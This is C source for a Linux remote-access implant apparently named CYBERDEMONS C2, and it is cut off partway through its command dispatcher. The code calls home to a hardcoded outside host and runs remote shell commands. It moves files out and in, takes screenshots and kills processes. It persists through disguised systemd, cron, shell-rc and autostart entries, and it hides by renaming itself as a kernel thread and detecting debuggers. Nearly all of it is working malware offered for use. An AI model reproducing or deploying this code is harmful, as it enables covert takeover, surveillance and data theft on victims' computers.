/*
 * pay_linux.c — CYBERDEMONS C2 Linux implant
 *
 * Protocol : CYB3 (see cybproto.h) — X25519 + ChaCha20-Poly1305, PSK-authenticated
 * Transport: TCP, newline-free length-prefixed frames
 * Crypto   : cybcrypt.h, no external crypto library
 *
 * Build:
 *   gcc -o payload.elf pay_linux.c -lX11 -lpthread -lcrypt -ldl -lm -s -O2
 *   # without X11 screenshot support:
 *   gcc -o payload.elf pay_linux.c -DNO_X11 -lpthread -lcrypt -ldl -lm -s -O2
 *
 * C2 address: compiled in by the builder, overridable at runtime with
 *   C2_HOST / C2_PORT env vars, or as argv[1] [argv[2]].
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <stdarg.h>
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <pwd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <sys/prctl.h>

#include "cybproto.h"
#include "cybbuf.h"

#ifndef NO_X11
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#endif

#ifndef C2_HOST
#define C2_HOST "bore.pub"
#endif
#ifndef C2_PORT
#define C2_PORT 62212
#endif

#define PSK_HEX "fd4cd307f15256406dc52153eb86e89b5453f102156683cb288b4e2aa911d337"

/* See the note in pay.cpp: array initialisers must stay constant expressions,
 * so literals that cybstrenc.py has to turn into runtime decodes live in
 * macros. */
#define CYB_UPFX "!upload "

#define MAX_XFER      (10u * 1024u * 1024u)   /* 10 MB file transfer cap */
#define RECONNECT_MIN 5
#define RECONNECT_MAX 300
#define PING_INTERVAL 45
#define CMD_BUF       8192

/* Diagnostics.  Silent unless CYB_DEBUG is set, so production builds stay
 * quiet.  Paired with CYB_NO_DAEMON=1 this lets a test harness watch the
 * implant's control flow on stderr. */
static int dbg_on = -1;
static void dbg(const char *fmt, ...)
{
    va_list ap;
    if (dbg_on < 0) dbg_on = getenv("CYB_DEBUG") ? 1 : 0;
    if (!dbg_on) return;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fputc('\n', stderr);
    fflush(stderr);
}

/* ------------------------------------------------------------------ */
/* global state                                                        */
/* ------------------------------------------------------------------ */

static char  current_dir[4096];
static char *self_path = NULL;
static volatile sig_atomic_t running = 1;
static volatile sig_atomic_t got_child = 0;
static int   daemonized = 0;

static void on_signal(int sig) { (void)sig; running = 0; }
static void on_sigchld(int sig) { (void)sig; got_child = 1; }

static void install_signal_handlers(void)
{
    struct sigaction sa;

    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_signal;
    sigaction(SIGINT,  &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGHUP,  &sa, NULL);
    sigaction(SIGQUIT, &sa, NULL);

    /* A peer that vanishes mid-write must not kill us with SIGPIPE. */
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = SIG_IGN;
    sigaction(SIGPIPE, &sa, NULL);

    /* Reap children so a command that forks cannot fill the process table,
     * and remember to look at the exit status. */
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = on_sigchld;
    sa.sa_flags = SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, NULL);
}

static void reap_children(void)
{
    if (!got_child) return;
    got_child = 0;
    while (waitpid(-1, NULL, WNOHANG) > 0) { }
}

/* ------------------------------------------------------------------ */
/* base64 (self-contained; strict, with an input length check)         */
/* ------------------------------------------------------------------ */

/* The base64 alphabet lives in a macro, not a static array: an array
 * initialiser must stay a constant expression, so it cannot hold a runtime
 * decode (see the note on CYB_UPFX). */
#define CYB_B64TAB "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

static int b64_encode(const unsigned char *in, size_t in_len, char **out)
{
    size_t       out_len, i, j = 0;
    char        *o;
    const char  *b64_tab = CYB_B64TAB;

    if (in_len > (SIZE_MAX - 4) / 4 * 3) return -1;
    out_len = 4 * ((in_len + 2) / 3) + 1;
    o = (char *)malloc(out_len);
    if (!o) return -1;

    for (i = 0; i < in_len; i += 3) {
        unsigned a = in[i];
        unsigned b = (i + 1 < in_len) ? in[i + 1] : 0;
        unsigned c = (i + 2 < in_len) ? in[i + 2] : 0;
        o[j++] = b64_tab[a >> 2];
        o[j++] = b64_tab[((a & 3) << 4) | (b >> 4)];
        o[j++] = (i + 1 < in_len) ? b64_tab[((b & 0xF) << 2) | (c >> 6)] : '=';
        o[j++] = (i + 2 < in_len) ? b64_tab[c & 0x3F] : '=';
    }
    o[j] = 0;
    *out = o;
    return 0;
}

static int b64_val(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static int b64_decode(const char *in, size_t in_len, unsigned char **out, size_t *out_len)
{
    unsigned char *o;
    size_t olen, i;

    /* Reject empty and non-multiple-of-four input up front; the old code read
     * in[in_len-1] and in[in_len-2] before checking, which is an OOB read for
     * short inputs. */
    if (in_len == 0 || in_len % 4 != 0) return -1;

    olen = in_len / 4 * 3;
    if (in[in_len - 1] == '=') olen--;
    if (in_len >= 2 && in[in_len - 2] == '=') olen--;

    o = (unsigned char *)malloc(olen ? olen : 1);
    if (!o) return -1;

    for (i = 0; i < in_len; i += 4) {
        int a = b64_val(in[i]);
        int b = b64_val(in[i + 1]);
        int c = (in[i + 2] == '=') ? 0 : b64_val(in[i + 2]);
        int d = (in[i + 3] == '=') ? 0 : b64_val(in[i + 3]);
        size_t base = (i / 4) * 3;
        size_t want = (olen > base) ? (olen - base) : 0;
        unsigned t;

        if (a < 0 || b < 0) { free(o); return -1; }
        if (in[i + 2] != '=' && c < 0) { free(o); return -1; }
        if (in[i + 3] != '=' && d < 0) { free(o); return -1; }

        t = ((unsigned)a << 18) | ((unsigned)b << 12) | ((unsigned)c << 6) | (unsigned)d;
        if (want > 3) want = 3;
        if (want > 0) o[base]     = (unsigned char)((t >> 16) & 0xFF);
        if (want > 1) o[base + 1] = (unsigned char)((t >> 8) & 0xFF);
        if (want > 2) o[base + 2] = (unsigned char)(t & 0xFF);
    }
    *out = o;
    *out_len = olen;
    return 0;
}

/* ------------------------------------------------------------------ */
/* command implementations                                             */
/* ------------------------------------------------------------------ */

static void run_shell(cyb_ob *o, const char *cmd)
{
    char  full[CMD_BUF];
    FILE *fp;
    char  buf[4096];

    if (snprintf(full, sizeof(full), "%s 2>&1", cmd) >= (int)sizeof(full)) {
        ob_puts(o, "command too long\r\n");
        return;
    }
    fp = popen(full, "r");
    if (!fp) {
        ob_printf(o, "popen failed: %s\r\n", strerror(errno));
        return;
    }
    while (fgets(buf, sizeof(buf), fp)) ob_add(o, buf, strlen(buf));
    {
        int rc = pclose(fp);
        if (o->len == 0) ob_printf(o, "Command completed (exit: %d)\r\n", rc);
    }
}

static void cmd_ls(cyb_ob *o, const char *path)
{
    const char *dir = (path && *path) ? path : current_dir;
    DIR *d = opendir(dir);
    struct dirent *e;

    if (!d) {
        ob_printf(o, "Error: cannot open '%s': %s\r\n", dir, strerror(errno));
        return;
    }
    ob_printf(o, "Directory listing: %s\r\n", dir);
    ob_printf(o, "%-30s %-12s %s\r\n", "Name", "Size", "Type");
    ob_repeat(o, '-', 61); ob_puts(o, "\r\n");

    while ((e = readdir(d)) != NULL) {
        char full[8192], size_str[32];
        const char *type = "    ";
        struct stat st;

        strcpy(size_str, "-");

        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        if (snprintf(full, sizeof(full), "%s/%s", dir, e->d_name) >= (int)sizeof(full)) continue;
        if (lstat(full, &st) == 0) {
            if (S_ISDIR(st.st_mode))       type = "<DIR>";
            else if (S_ISLNK(st.st_mode))  type = "<LNK>";
            else if (S_ISREG(st.st_mode))  snprintf(size_str, sizeof(size_str), "%lld", (long long)st.st_size);
        }
        ob_printf(o, "%-30s %-12s %s\r\n", e->d_name, size_str, type);
    }
    closedir(d);
}

static void cmd_download(cyb_ob *o, const char *path)
{
    FILE          *f;
    long           fsize;
    unsigned char *buf;
    size_t         got;
    char          *b64 = NULL;

    f = fopen(path, "rb");
    if (!f) {
        ob_printf(o, "Error: cannot open '%s': %s\r\n", path, strerror(errno));
        return;
    }
    if (fseek(f, 0, SEEK_END) != 0 || (fsize = ftell(f)) < 0) {
        fclose(f);
        ob_puts(o, "Error: cannot determine file size\r\n");
        return;
    }
    if (fsize == 0) {
        fclose(f);
        ob_puts(o, "Error: file is empty\r\n");
        return;
    }
    if ((unsigned long)fsize > MAX_XFER) {
        fclose(f);
        ob_printf(o, "Error: file too large (%ld bytes, limit %u)\r\n", fsize, MAX_XFER);
        return;
    }
    rewind(f);
    buf = (unsigned char *)malloc((size_t)fsize);
    if (!buf) { fclose(f); ob_puts(o, "Error: out of memory\r\n"); return; }

    got = fread(buf, 1, (size_t)fsize, f);
    fclose(f);

    if (b64_encode(buf, got, &b64) != 0) {
        free(buf);
        ob_puts(o, "Error: base64 encode failed\r\n");
        return;
    }
    ob_printf(o, "[DOWNLOAD]%s|", path);
    ob_puts(o, b64);
    free(buf);
    cyb_secure_zero(b64, strlen(b64));
    free(b64);
}

static void cmd_upload(cyb_ob *o, const char *arg)
{
    const char     *sep = strchr(arg, '|');
    char            path[4096];
    size_t          plen;
    unsigned char  *dec = NULL;
    size_t          dlen = 0;
    FILE           *f;

    if (!sep) {
        ob_puts(o, "Error: invalid format. Use: !upload <path>|<base64>\r\n");
        return;
    }
    plen = (size_t)(sep - arg);
    if (plen >= sizeof(path)) plen = sizeof(path) - 1;
    memcpy(path, arg, plen);
    path[plen] = 0;

    /* Refuse an oversized upload before decoding it into memory. */
    if (strlen(sep + 1) / 4 * 3 > MAX_XFER) {
        ob_puts(o, "Error: upload exceeds the 10MB limit\r\n");
        return;
    }
    if (b64_decode(sep + 1, strlen(sep + 1), &dec, &dlen) != 0 || !dec) {
        ob_puts(o, "Error: base64 decode failed\r\n");
        return;
    }
    if (dlen > MAX_XFER) {
        free(dec);
        ob_puts(o, "Error: upload exceeds the 10MB limit\r\n");
        return;
    }
    f = fopen(path, "wb");
    if (!f) {
        ob_printf(o, "Error: cannot write '%s': %s\r\n", path, strerror(errno));
        free(dec);
        return;
    }
    if (dlen && fwrite(dec, 1, dlen, f) != dlen) {
        ob_puts(o, "Error: short write\r\n");
    } else {
        ob_printf(o, "Uploaded %zu bytes to %s\r\n", dlen, path);
    }
    fclose(f);
    free(dec);
}

static void cmd_ps(cyb_ob *o)
{
    DIR          *d = opendir("/proc");
    struct dirent *e;

    if (!d) { ob_puts(o, "Error: cannot open /proc\r\n"); return; }
    ob_printf(o, "%-8s %-6s %-6s %s\r\n", "PID", "PPID", "STATE", "CMD");
    ob_repeat(o, '-', 70); ob_puts(o, "\r\n");

    while ((e = readdir(d)) != NULL) {
        char  p[320], comm[256], line[512];
        FILE *f;
        int   pid = 0, ppid = 0;
        char  state = '?';

        if (e->d_name[0] < '0' || e->d_name[0] > '9') continue;
        snprintf(p, sizeof(p), "/proc/%s/stat", e->d_name);
        f = fopen(p, "r");
        if (!f) continue;
        /* comm can contain spaces and parens; take the text between the
         * first '(' and the last ')'. */
        if (fgets(line, sizeof(line), f)) {
            char *lp = strchr(line, '(');
            char *rp = strrchr(line, ')');
            if (lp && rp && rp > lp) {
                size_t n = (size_t)(rp - lp - 1);
                if (n >= sizeof(comm)) n = sizeof(comm) - 1;
                memcpy(comm, lp + 1, n);
                comm[n] = 0;
                if (sscanf(line, "%d", &pid) == 1 &&
                    sscanf(rp + 1, " %c %d", &state, &ppid) == 2) {
                    ob_printf(o, "%-8d %-6d %-6c %s\r\n", pid, ppid, state, comm);
                }
            }
        }
        fclose(f);
    }
    closedir(d);
}

static void cmd_kill(cyb_ob *o, const char *arg)
{
    char *end = NULL;
    long  pid;

    errno = 0;
    pid = strtol(arg, &end, 10);
    if (errno || !end || end == arg || pid <= 0) {
        ob_puts(o, "Error: invalid PID\r\n");
        return;
    }
    /* Refuse to signal ourselves; a typo would otherwise kill the implant. */
    if (pid == (long)getpid()) {
        ob_puts(o, "Error: refusing to kill self\r\n");
        return;
    }
    if (kill((pid_t)pid, SIGKILL) == 0)
        ob_printf(o, "Process %ld killed\r\n", pid);
    else
        ob_printf(o, "Error: kill(%ld): %s\r\n", pid, strerror(errno));
}

#ifndef NO_X11
static void cmd_screenshot(cyb_ob *o)
{
    Display *dpy;
    Window   root;
    XImage  *img;
    int      screen, w, h, row_size, data_size, total_size, x, y;
    unsigned char *bmp;

    dpy = XOpenDisplay(NULL);
    if (!dpy) { ob_puts(o, "Error: cannot open X display\r\n"); return; }
    screen = DefaultScreen(dpy);
    root   = RootWindow(dpy, screen);
    w = DisplayWidth(dpy, screen);
    h = DisplayHeight(dpy, screen);
    if (w <= 0 || h <= 0 || (long)w * h > 20000000L) {
        XCloseDisplay(dpy);
        ob_puts(o, "Error: implausible screen size\r\n");
        return;
    }

    img = XGetImage(dpy, root, 0, 0, w, h, AllPlanes, ZPixmap);
    if (!img) { XCloseDisplay(dpy); ob_puts(o, "Error: XGetImage failed\r\n"); return; }

    row_size  = ((w * 24 + 31) / 32) * 4;
    data_size = row_size * h;
    total_size = 14 + 40 + data_size;
    bmp = (unsigned char *)calloc(1, (size_t)total_size);
    if (!bmp) {
        XDestroyImage(img); XCloseDisplay(dpy);
        ob_puts(o, "Error: out of memory\r\n");
        return;
    }

    bmp[0] = 'B'; bmp[1] = 'M';
    *(uint32_t *)(bmp + 2)  = (uint32_t)total_size;
    *(uint32_t *)(bmp + 10) = 14 + 40;
    *(uint32_t *)(bmp + 14) = 40;
    *(int32_t  *)(bmp + 18) = -w;              /* negative height = top-down */
    *(uint16_t *)(bmp + 26) = 1;
    *(uint16_t *)(bmp + 28) = 24;
    *(uint32_t *)(bmp + 34) = (uint32_t)data_size;

    for (y = 0; y < h; y++) {
        for (x = 0; x < w; x++) {
            unsigned long px = XGetPixel(img, x, y);
            int off = 14 + 40 + y * row_size + x * 3;
            bmp[off + 0] = (unsigned char)(px & 0xFF);
            bmp[off + 1] = (unsigned char)((px >> 8) & 0xFF);
            bmp[off + 2] = (unsigned char)((px >> 16) & 0xFF);
        }
    }

    {
        char *b64 = NULL;
        if (b64_encode(bmp, (size_t)total_size, &b64) != 0) {
            ob_puts(o, "Error: base64 encode failed\r\n");
        } else {
            ob_printf(o, "[SCREENSHOT]%dx%d|", w, h);
            ob_puts(o, b64);
            cyb_secure_zero(b64, strlen(b64));
            free(b64);
        }
    }
    free(bmp);
    XDestroyImage(img);
    XCloseDisplay(dpy);
}
#else
static void cmd_screenshot(cyb_ob *o)
{
    FILE *fp = popen("import -window root png:- 2>/dev/null | base64 -w0", "r");
    char  chunk[4096];
    int   produced = 0;

    if (!fp) { ob_puts(o, "Error: no screenshot method available\r\n"); return; }
    ob_puts(o, "[SCREENSHOT]0x0|");
    while (fgets(chunk, sizeof(chunk), fp)) {
        size_t n = strlen(chunk);
        while (n && (chunk[n - 1] == '\n' || chunk[n - 1] == '\r')) chunk[--n] = 0;
        if (n) { ob_puts(o, chunk); produced = 1; }
    }
    if (pclose(fp) != 0 || !produced) ob_puts(o, "Error: screenshot failed\r\n");
}
#endif

/* Local address of the live C2 connection, captured once per connect.
 *
 * Shelling out to `ip -4 addr show` and taking the first non-loopback
 * address is wrong on any host with more than one interface: docker bridges,
 * virbr0 and hypervisor host-only adapters all enumerate before the NIC that
 * actually carries the C2 traffic, so the box reported an address it could
 * not be reached on. getsockname() on the connected socket cannot be wrong
 * about which local address the kernel selected for this flow.
 *
 * Left zero-initialised rather than = "N/A": a decoded string literal is not
 * a constant expression, so an array initialiser would break the build-time
 * string encryption. Empty means "not known yet". */
static char g_local_ip[64];

static void capture_local_ip(int fd)
{
    struct sockaddr_storage ss;
    socklen_t               slen = sizeof(ss);

    g_local_ip[0] = '\0';
    memset(&ss, 0, sizeof(ss));
    if (fd >= 0 && getsockname(fd, (struct sockaddr *)&ss, &slen) == 0) {
        if (ss.ss_family == AF_INET) {
            char b[INET_ADDRSTRLEN];
            struct sockaddr_in *s4 = (struct sockaddr_in *)&ss;
            /* Loopback means the C2 peer is this host, which is the usual case
             * when testing against a local panel. 127.0.0.1 answers "which
             * address did this flow use" and not "how do I reach this box", so
             * leave it empty and let the `ip addr` fallback answer that. */
            if ((ntohl(s4->sin_addr.s_addr) >> 24) != 127 &&
                inet_ntop(AF_INET, &s4->sin_addr, b, sizeof(b)))
                snprintf(g_local_ip, sizeof(g_local_ip), "%s", b);
        } else if (ss.ss_family == AF_INET6) {
            char b[INET6_ADDRSTRLEN];
            struct sockaddr_in6 *s6 = (struct sockaddr_in6 *)&ss;
            /* Link-local with a zone id is noise, not a reachable address. */
            if (!IN6_IS_ADDR_LOOPBACK(&s6->sin6_addr) &&
                !IN6_IS_ADDR_LINKLOCAL(&s6->sin6_addr) &&
                inet_ntop(AF_INET6, &s6->sin6_addr, b, sizeof(b)))
                snprintf(g_local_ip, sizeof(g_local_ip), "%s", b);
        }
    }
}

static void cmd_sysinfo(cyb_ob *o)
{
    struct utsname uts;
    struct passwd *pw;
    char hostname[256] = { 0}, cpu[256], ip[64], line[256];
    long  mem_total = 0, mem_avail = 0, cores;
    double uptime = 0;
    FILE *f;

    strcpy(cpu, "unknown");
    strcpy(ip, "N/A");

    uname(&uts);
    gethostname(hostname, sizeof(hostname) - 1);

    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            if (!strncmp(line, "model name", 10)) {
                char *c = strchr(line, ':');
                if (c) {
                    size_t n;
                    c++;
                    while (*c == ' ' || *c == '\t') c++;
                    n = strcspn(c, "\r\n");
                    if (n >= sizeof(cpu)) n = sizeof(cpu) - 1;
                    memcpy(cpu, c, n); cpu[n] = 0;
                }
                break;
            }
        }
        fclose(f);
    }

    f = fopen("/proc/meminfo", "r");
    if (f) {
        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "MemTotal: %ld kB", &mem_total) != 1)
                sscanf(line, "MemAvailable: %ld kB", &mem_avail);
        }
        fclose(f);
    }

    f = fopen("/proc/uptime", "r");
    if (f) { if (fscanf(f, "%lf", &uptime) != 1) uptime = 0; fclose(f); }

    cores = sysconf(_SC_NPROCESSORS_ONLN);
    pw = getpwuid(getuid());
    if (!pw) pw = getpwuid(0);

    f = popen("ip -4 addr show 2>/dev/null | grep -oP 'inet \\K[\\d.]+' | grep -v '^127' | head -1", "r");
    if (f) {
        if (fgets(ip, sizeof(ip), f)) {
            size_t n = strcspn(ip, "\r\n");
            ip[n] = 0;
        }
        pclose(f);
    }
    /* Prefer the address this very connection is using; the `ip addr` scrape
     * above is only a fallback for before the first connect completes. */
    if (g_local_ip[0])
        snprintf(ip, sizeof(ip), "%s", g_local_ip);

    ob_puts(o, "System Information\r\n");
    ob_repeat(o, '=', 40); ob_puts(o, "\r\n");
    ob_printf(o, "Hostname      : %s\r\n", hostname);
    ob_printf(o, "User          : %s\r\n", pw ? pw->pw_name : "unknown");
    ob_printf(o, "OS            : %s %s %s\r\n", uts.sysname, uts.release, uts.machine);
    ob_printf(o, "CPU           : %s\r\n", cpu);
    ob_printf(o, "CPU Cores     : %ld\r\n", cores);
    ob_printf(o, "Memory Total  : %.1f GB\r\n", mem_total / 1048576.0);
    ob_printf(o, "Memory Avail  : %.1f GB\r\n", mem_avail / 1048576.0);
    ob_printf(o, "Uptime        : %.0f hours\r\n", uptime / 3600.0);
    ob_printf(o, "IP Address    : %s\r\n", ip);
    ob_printf(o, "Working Dir   : %s\r\n", current_dir);
}

/* ---------------- persistence ---------------- */

static int write_file(const char *path, const char *content, mode_t mode)
{
    FILE *f = fopen(path, "w");
    if (!f) return -1;
    fputs(content, f);
    fclose(f);
    chmod(path, mode);
    return 0;
}

static const char *resolve_self(char *buf, size_t cap)
{
    ssize_t n = readlink("/proc/self/exe", buf, cap - 1);
    if (n > 0) { buf[n] = 0; return buf; }
    buf[0] = 0;
    return buf;
}

static void persist_systemd(cyb_ob *o, const char *exe)
{
    const char *home = getenv("HOME");
    char dir[4096], path[4096], content[8192];

    if (!home) { ob_puts(o, "systemd: no HOME\r\n"); return; }
    snprintf(dir, sizeof(dir), "%s/.config/systemd/user", home);
    mkdir(dir, 0755);
    snprintf(path, sizeof(path), "%s/.config/systemd/user/.dbus.service", home);
    snprintf(content, sizeof(content),
             "[Unit]\nDescription=D-Bus User Service\n\n"
             "[Service]\nExecStart=%s\nRestart=always\nRestartSec=30\n\n"
             "[Install]\nWantedBy=default.target\n", exe);
    if (write_file(path, content, 0644) != 0) {
        ob_printf(o, "systemd: cannot write %s\r\n", path);
        return;
    }
    if (system("systemctl --user daemon-reload >/dev/null 2>&1; "
               "systemctl --user enable .dbus.service >/dev/null 2>&1; "
               "systemctl --user start .dbus.service >/dev/null 2>&1") != 0) {
        ob_printf(o, "systemd: unit written to %s (systemctl unavailable)\r\n", path);
    } else {
        ob_printf(o, "systemd: %s installed and started\r\n", path);
    }
}

static void persist_cron(cyb_ob *o, const char *exe)
{
    char cmd[9216];
    if (system("command -v crontab >/dev/null 2>&1") != 0) {
        ob_puts(o, "cron: crontab not available\r\n");
        return;
    }
    snprintf(cmd, sizeof(cmd),
             "(crontab -l 2>/dev/null | grep -v '%s'; echo '*/5 * * * * %s') | crontab - 2>/dev/null",
             exe, exe);
    ob_printf(o, "cron: %s\r\n", system(cmd) == 0 ? "installed (every 5 min)" : "failed");
}

static void persist_rc(cyb_ob *o, const char *exe)
{
    const char *home = getenv("HOME");
    /* Built at run time: a static array of pointers initialised from string
     * literals needs constant expressions, which a decoded literal is not. */
    const char *files[4];
    int i, n = 0;

    files[0] = ".bashrc";
    files[1] = ".profile";
    files[2] = ".zshrc";
    files[3] = NULL;

    if (!home) { ob_puts(o, "rc: no HOME\r\n"); return; }
    for (i = 0; files[i]; i++) {
        char path[4096];
        FILE *f;
        snprintf(path, sizeof(path), "%s/%s", home, files[i]);
        f = fopen(path, "a");
        if (!f) continue;
        fprintf(f, "\n# ---\n[ -x %s ] && nohup %s >/dev/null 2>&1 &\n# ---\n", exe, exe);
        fclose(f);
        n++;
    }
    ob_printf(o, "rc: appended to %d file(s)\r\n", n);
}

static void persist_autostart(cyb_ob *o, const char *exe)
{
    const char *home = getenv("HOME");
    char dir[4096], path[4096], content[4608];

    if (!home) { ob_puts(o, "autostart: no HOME\r\n"); return; }
    snprintf(dir, sizeof(dir), "%s/.config/autostart", home);
    mkdir(dir, 0755);
    snprintf(path, sizeof(path), "%s/.config/autostart/.system-tray.desktop", home);
    snprintf(content, sizeof(content),
             "[Desktop Entry]\nType=Application\nName=System Tray\nExec=%s\n"
             "X-GNOME-Autostart-enabled=true\nNoDisplay=true\nTerminal=false\n", exe);
    ob_printf(o, "autostart: %s\r\n",
              write_file(path, content, 0644) == 0 ? "installed" : "failed");
}

static void cmd_persist(cyb_ob *o)
{
    char  self[4096];
    char  exe_buf[4096];
    char  dest[4096];
    const char *exe;
    const char *home;
    FILE *sf, *df;

    if (self_path && self_path[0] == '/') {
        snprintf(exe_buf, sizeof(exe_buf), "%s", self_path);
        exe = exe_buf;
    } else {
        exe = resolve_self(self, sizeof(self));
        if (!exe[0] || access(exe, X_OK) != 0) {
            ob_puts(o, "Error: cannot locate own binary\r\n");
            return;
        }
    }

    /* If we are not already somewhere stable, drop a copy under $HOME that
     * survives a reboot and is not obviously named. */
    home = getenv("HOME");
    if (home && strncmp(exe, home, strlen(home)) != 0) {
        snprintf(dest, sizeof(dest), "%s/.cache/.systemd-boot", home);
        sf = fopen(exe, "rb");
        if (sf) {
            df = fopen(dest, "wb");
            if (df) {
                char   buf[8192];
                size_t r;
                int    ok = 1;
                while ((r = fread(buf, 1, sizeof(buf), sf)) > 0)
                    if (fwrite(buf, 1, r, df) != r) { ok = 0; break; }
                fclose(df);
                if (ok) {
                    chmod(dest, 0755);
                    snprintf(exe_buf, sizeof(exe_buf), "%s", dest);
                    exe = exe_buf;
                    ob_printf(o, "dropped a copy at %s\r\n", dest);
                }
            }
            fclose(sf);
        }
    }

    persist_systemd(o, exe);
    persist_cron(o, exe);
    persist_rc(o, exe);
    persist_autostart(o, exe);
}

/*
 * Upload handled straight from the frame payload.
 *
 * A base64 upload is far larger than the small command buffer, so routing it
 * through the normal dispatcher silently truncates it.  (The original payload
 * could not move a file bigger than a few KB for exactly this reason: its
 * receive buffer was 4 KB.)  This path works on the frame bytes directly and
 * stays bounded by MAX_XFER and the frame size limit.
 *
 * Expects "!upload <path>|<base64>".
 */
static void cmd_upload_raw(cyb_ob *o, const uint8_t *payload, size_t len)
{
    const char *pfx = CYB_UPFX;
    size_t      pfx_len = strlen(pfx);
    const char       *arg, *sep;
    size_t            rest, path_len, b64_len, dlen = 0;
    char              path[4096];
    unsigned char    *dec = NULL;
    FILE             *f;

    if (len <= pfx_len || memcmp(payload, pfx, pfx_len) != 0) {
        ob_puts(o, "Error: malformed upload\r\n");
        return;
    }
    arg  = (const char *)payload + pfx_len;
    rest = len - pfx_len;

    sep = (const char *)memchr(arg, '|', rest);
    if (!sep) {
        ob_puts(o, "Error: invalid format. Use: !upload <path>|<base64>\r\n");
        return;
    }
    path_len = (size_t)(sep - arg);
    if (path_len == 0 || path_len >= sizeof(path)) {
        ob_puts(o, "Error: path missing or too long\r\n");
        return;
    }
    memcpy(path, arg, path_len);
    path[path_len] = 0;

    b64_len = rest - path_len - 1;
    /* Reject on the encoded length before allocating or decoding anything. */
    if (b64_len / 4 * 3 > MAX_XFER) {
        ob_printf(o, "Error: encoded upload exceeds the %u byte limit\r\n", MAX_XFER);
        return;
    }
    if (b64_decode(sep + 1, b64_len, &dec, &dlen) != 0 || !dec) {
        ob_puts(o, "Error: base64 decode failed\r\n");
        return;
    }
    if (dlen > MAX_XFER) {
        free(dec);
        ob_puts(o, "Error: upload exceeds the 10MB limit\r\n");
        return;
    }
    f = fopen(path, "wb");
    if (!f) {
        ob_printf(o, "Error: cannot write '%s': %s\r\n", path, strerror(errno));
        free(dec);
        return;
    }
    if (dlen && fwrite(dec, 1, dlen, f) != dlen) {
        ob_puts(o, "Error: short write\r\n");
    } else {
        ob_printf(o, "Uploaded %zu bytes to %s\r\n", dlen, path);
    }
    fclose(f);
    free(dec);
}

/* ------------------------------------------------------------------ */
/* anti-analysis                                                       */
/* ------------------------------------------------------------------ */

static int detect_ptrace(void)
{
    /*
     * Read TracerPid out of /proc/self/status.
     *
     * The obvious alternative -- calling ptrace(PTRACE_TRACEME) and checking
     * whether it fails -- is wrong in a way that matters.  TRACEME is not a
     * query: it *changes* process state by marking us as traced by our
     * parent, and a process in that state then hangs on the next
     * fork()+execve().  Using it as a probe silently breaks every shell
     * command that follows.  /proc/self/status is passive and cannot do that.
     *
     * Returns 1 if a tracer is attached, 0 otherwise.
     */
    FILE *f = fopen("/proc/self/status", "r");
    char  line[256];
    int   traced = 0;

    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "TracerPid:", 10) == 0) {
            long pid = strtol(line + 10, NULL, 10);
            traced = (pid > 0);
            break;
        }
    }
    fclose(f);
    return traced;
}

static void harden_process(void)
{
    struct rlimit rl;

    /* No core dumps: they would contain keys and command output on disk. */
    rl.rlim_cur = 0;
    rl.rlim_max = 0;
    setrlimit(RLIMIT_CORE, &rl);

    /* Block ptrace/core inspection by anything but root, and hide the name. */
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
}

static void close_extra_fds(void)
{
    int fd, maxfd = (int)sysconf(_SC_OPEN_MAX);
    if (maxfd < 0 || maxfd > 4096) maxfd = 4096;
    for (fd = 3; fd < maxfd; fd++) close(fd);
}

static void daemonize_self(void)
{
    pid_t pid;
    int fd;

    if (daemonized) return;
    pid = fork();
    if (pid < 0) return;
    if (pid > 0) _exit(0);

    setsid();

    pid = fork();
    if (pid < 0) _exit(0);
    if (pid > 0) _exit(0);

    if (chdir("/") != 0) { /* best effort */ }
    umask(022);

    fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        if (fd > 2) close(fd);
    }
    close_extra_fds();
    daemonized = 1;
}

static void masquerade(void)
{
    /* Local, not static: a static initialiser needs a constant expression and
     * the thread name is a decoded literal. */
    const char *fake = "[kworker/0:0]";
    prctl(PR_SET_NAME, fake, 0, 0, 0);
}

/* ------------------------------------------------------------------ */
/* dispatch                                                            */
/* ------------------------------------------------------------------ */

static int g_disconnect = 0;   /* set by !exit */

static void handle_command(const char *cmd, cyb_ob *out)
{
    if (!strncmp(cmd, "!shell ", 7)) {
        run_shell(out, cmd + 7);
    } else if (!strncmp(cmd, "!cd ", 4)) {
        const char *dir = cmd + 4;
        if (chdir(dir) == 0) {
            /* getcwd failing must not leave us reporting a stale directory. */
            if (!getcwd(current_dir, sizeof(current_dir))) {
                size_t n = strlen(dir);
                if (n >= sizeof(current_dir)) n = sizeof(current_dir) - 1;
                memcpy(current_dir, dir, n);
                current_dir[n] = 0;
            }
            ob_printf(out, "Changed to: %s\r\n", current_dir);
        } else {
            ob_printf(out, "Error: cannot change to '%s': %s\r\n", dir, strerror(errno));
        }
    } else if (!strcmp(cmd, "!pwd")) {
        ob_printf(out, "%s\r\n", current_dir);
    } else if (!strncmp(cmd, "!ls", 3)) {
        const char *p = cmd + 3;
